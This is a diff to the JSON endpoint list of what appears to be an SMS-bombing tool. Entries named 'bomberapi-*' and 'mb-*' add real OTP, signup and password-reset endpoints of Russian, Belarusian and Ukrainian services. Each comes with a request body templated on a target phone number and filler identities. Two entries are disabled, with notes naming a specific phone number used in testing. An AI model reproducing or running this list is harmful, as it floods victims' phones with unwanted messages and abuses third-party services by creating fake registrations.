@@ -3019,7 +3019,9 @@
           202,
           204
         ]
-      }
+      },
+      "enabled": false,
+      "note": "disabled: API success but no SMS delivered to +79313995224"
     },
     {
       "name": "bomberapi-rolf",
@@ -3059,6 +3061,268 @@
       },
       "headers": {
         "Content-Type": "application/json"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "enabled": false,
+      "note": "disabled: API success but no SMS delivered to +79313995224"
+    },
+    {
+      "name": "bomberapi-av",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://oauth.av.ru/check-phone",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{phone_fmt1}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-vsk",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://shop.vsk.ru/ajax/auth/postSmsX/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "phone": "{phone_fmt2}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-srochnodengi",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://mapi-order.srochnodengi.ru/api/v1/auth/send-sms/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "first_name": "Ivan",
+        "last_name": "Ivanov",
+        "middle_name": "Ivanovich",
+        "email": "ivanov{ts}@mail.ru",
+        "phone": "{phone_fmt3}",
+        "birthday": "1990-01-01"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-aptekaapril",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://web-api.apteka-april.ru/users",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "password": "Pac{code}!",
+        "name": "Ivan",
+        "sname": "Ivanov"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-profee",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://restapi.profee.com/api/v1/wallets",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "email": "test{ts}@mail.ru",
+        "password": "Pac{code}!Aa",
+        "phone": "{digits}",
+        "source[platform]": "SITE",
+        "source[scenario]": "REGISTRATION",
+        "source[referer]": "www"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-nadodeneg",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.nadodeneg.ru/user",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "agree": true,
+        "email": "test{ts}@mail.ru",
+        "ga_cid": "1566208007.1648898983",
+        "is_esia_user": false,
+        "last_name": "Ivanov",
+        "first_name": "Ivan",
+        "middle_name": "Ivanovich",
+        "mobile_phone": "{digits}",
+        "requested_amount": 10000,
+        "requested_days": 7,
+        "step": 2,
+        "target_url": null
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-smilebus",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://618.by/api/v2/auth/login",
+      "countries": [
+        "BY"
+      ],
+      "body_type": "form",
+      "body": {
+        "phone": "{digits}",
+        "password": "nikak52N12",
+        "uid": "",
+        "name": "",
+        "surname": ""
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "mb-rutube",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://rutube.ru/api/accounts/sendpass/phone",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "mb-rabota",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.rabota.ru/remind",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "credential": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "mb-alfalife",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://alfalife.cc/auth.php",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "mb-3040",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://3040.com.ua/taxi-ordering",
+      "countries": [
+        "UA",
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "callback-phone": "{e164}"
       },
       "success": {
         "status": [
